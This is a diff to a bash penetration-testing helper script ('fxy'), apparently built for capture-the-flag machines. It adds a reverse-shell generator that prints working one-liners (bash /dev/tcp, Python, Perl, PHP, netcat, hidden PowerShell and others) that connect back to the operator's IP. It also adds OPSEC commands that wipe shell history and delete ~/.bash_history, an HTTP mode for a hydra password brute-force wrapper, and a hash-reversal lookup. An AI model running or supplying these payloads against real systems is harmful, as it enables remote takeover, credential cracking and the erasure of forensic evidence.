@@ -20,6 +20,7 @@ show_help() {
   grep "^##" "$0" | cut -d' ' -f2- | while IFS= read -r cmd; do
     echo -e "  fxy $cmd"
   done | sort
+  echo
 }
 
 checkCmd() {
@@ -86,7 +87,7 @@ createUserPassLists() {
   if [ "$(which "genuserlst.py")" ]; then
     genuserlst.py "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u > "$FPATH/user.lst"
   else
-    echo "[*] Did not find 'genuserlst.py' in PATH. Falling back to standard mode."
+    echo "[*] Did not find 'genuserlst.py' in PATH. Falling back to simple mode."
     cut -d: -f1 "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u | grep -v ^$ > "$FPATH/user.lst"
   fi
   # passlist
@@ -211,12 +212,15 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   echo "    Ctrl-z"
   echo "    stty raw -echo"
   echo "    fg + [Enter x 2]"
-  # reset?
-  echo "    export SHELL=/bin/bash"
-  echo "    export TERM=$TERM" #export TERM=screen
+  echo -n "    export SHELL=/bin/bash; export TERM=$TERM;"
   ROWS="$(stty -a | grep -oE "rows [0-9]{1,}" | cut -d' ' -f2)"
   COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
-  echo -e "    stty rows $ROWS columns $COLS\n"
+  echo -e " stty rows $ROWS columns $COLS\n"
+  # https://attack.mitre.org/techniques/T1070/003/
+  echo "> OPSEC:"
+  echo "    unset HISTFILE; export HISTFILESIZE=0;"
+  echo "    # make sure to check history before deleting!"
+  echo -e "    history -c; rm ~/.bash_history\n"
   echo "> $CMD"
   bash -c "$CMD"
   exit
@@ -231,7 +235,7 @@ if [ "$1" == "socat" ]; then
   else
     PORT="9001"
   fi
-  CMD="$CMD file:`tty`,raw,echo=0 tcp-listen:$PORT"
+  CMD="$CMD file:$(tty),raw,echo=0 tcp-listen:$PORT"
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
   echo "> Run this on your target:"
   echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
@@ -751,23 +755,27 @@ if [ "$1" == "hydra" ] && [ "$#" -eq 1 ]; then
   echo "  fxy hydra ssh [port] [username]"
   echo "  fxy hydra ftp [port] [username]"
   echo "  fxy hydra smb [port] [username]"
-  #echo "  fxy hydra http [url] [username]"
+  echo "  fxy hydra http [url] [username] [subdir]"
   exit
 fi
 
 # hydra -I -L user.lst -P pass.lst -u -e sr -s 22333 127.0.0.1 ssh
 # hydra -I -L user.lst -P pass.lst -u -e sr -s 21 127.0.0.1 ftp
 # hydra -I -L user.lst -P pass.lst -u -e sr -s 445 127.0.0.1 smb
+# hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
   CMD="hydra"; checkCmd
   createUserPassLists
   FPATH="/dev/shm/.fxy"
+  SUBDIR="" # used for http
 
-  case "$2" in
-    "ssh" )   PORT="-s 22"; SVC="ssh" ;;
-    "ftp")    PORT="-s 21"; SVC="ftp" ;;
-    "smb")    PORT="-s 445"; SVC="smb" ;;
-    *)        echo "[!] Error parsing service to attack!"; exit ;;
+  SVC="$2"
+  case "$SVC" in
+    "ssh" )             PORT="-s 22"; SVC="ssh" ;;
+    "ftp")              PORT="-s 21"; SVC="ftp" ;;
+    "smb")              PORT="-s 445"; SVC="smb" ;;
+    "http"|"http-get")  PORT="-s 80"; SVC="http-get"; SUBDIR="/" ;;
+    *)                  echo "[!] Error parsing service to attack!"; exit ;;
   esac
 
   if [ "$#" -ge 3 ]; then
@@ -780,23 +788,118 @@ if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
     USRNME="-L $FPATH/user.lst"
   fi
 
-  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC"
+  if [ "$#" -ge 5 ]; then
+    SUBDIR="$5"
+  fi
+
+  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC $SUBDIR"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
   exit
 fi
 
+## rev(shell) [type] [port]\t\t\t: Reverse shells (bash, php, python, perl, ...)
+# revshell help
+if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -eq 1 ]; then
+  echo "Available commands:"
+  echo "  fxy revshell [type] [port]"
+  echo -e "\nAvailable types:"
+  echo "  bash, php, pyton2|py2, python|python3, py|py3, perl, ruby, nc|ncat|netcat, awk\n"
+  echo -e "\n[*] Checkout for more: https://book.hacktricks.xyz/shells/shells/linux\n"
+  exit
+fi
+
+# revshell help
+if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
+  PORT="9001"
+  if [ "$#" -ge 3 ]; then
+    PORT="$3"
+  fi
+
+  echo -e "> Run this on your target:\n"
+  TYPE="$2"
+  case "$TYPE" in
+    "bash" )                        echo "bash -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
+    "php")                          echo "php -r '\$s=fsockopen(\"$(getIP)\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
+    "python2"|"py2")                echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
+    "python"|"python3"|"py"|"py3")  echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
+    "perl" )                        echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
+    "ruby" )                        echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
+    "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
+    "awk")                          echo -e "[*] WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
+    "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
+    "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
+    "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
+    "telnet" )                      echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
+    *)                              echo "[!] Unknown revshell type!" ;;
+  esac
+  echo
+  exit
+fi
+
+## h(ash)s(earch) [md5|sha1|...] [hash]\t: Search for hashes
+# hashsearch help
+if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 1 ]; then
+  echo "Available commands:"
+  echo "  fxy h(ash)s(earch) [md5|sha1|sha256|sha356|sha512] [hash]"
+  exit
+fi
+
+if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
+  TYPE="$2"
+  HASH="$3"
+
+  RES="$(curl -ski https://hashtoolkit.com/reverse-$TYPE-hash/?hash=$HASH)"
+
+  if [ -n "$(grep -i 'No hashes found for' <<< $RES)" ]; then
+    echo -e "\n[!] hashtoolkit.com: No hashes found\n"; exit
+  else
+    PASSWD="$(grep -m 1 -io "/generate-hash/?text=.*>" <<< $RES | cut -d'>' -f2 | sed 's,</a,,')"
+    PASSWD="$(sed 's,&lt;,<,' <<< $PASSWD)"
+    PASSWD="$(sed 's,&gt;,>,' <<< $PASSWD)"
+    echo -e "\n[*] Match found: $PASSWD\n"; exit
+  fi
+fi
+
+## h(ash)g(en) [md5|sha1|sha256|...] [input]\t: Generate hashes from input
+# hashgen help
+if { [ "$1" == "hashgen" ] || [ "$1" == "hg" ]; } && [ "$#" -eq 1 ]; then
+  echo "Available commands:"
+  echo "  fxy h(ash)g(en) [md5|sha1|sha256|sha356|sha512] [hash]"
+  exit
+fi
+
+if { [ "$1" == "hashgen" ] || [ "$1" == "hg" ]; } && [ "$#" -eq 3 ]; then
+  TYPE="$2"
+  INPUT="$3"
+
+  case "$TYPE" in
+    "md5" )             CMD="md5sum" ;;
+    "sha"|"sha1")       CMD="sha1sum" ;;
+    "sha256"|"sha2")    CMD="sha256sum" ;;
+    "sha384"|"sha3")    CMD="sha384sum" ;;
+    "sha512"|"sha5")    CMD="sha512sum" ;;
+    *)                  echo "[!] Error parsing type of hash!"; exit ;;
+  esac
+
+  echo -e "\n$($CMD <<< "$INPUT" | cut -d' ' -f1)\n"
+  exit
+fi
+
+
+
 
 # fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
 # gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
-# hydra ssh ftp basicauth smb
 # msf multi handler
 # msf venom most common
 # smbclient
 # smbmap
 # enum4linux
 # bash one liners
+# fix stuff:
+# /usr/bin/python3 -m pip install --upgrade pip
 
 # Nothing found? Invalid command?
 show_help; exit
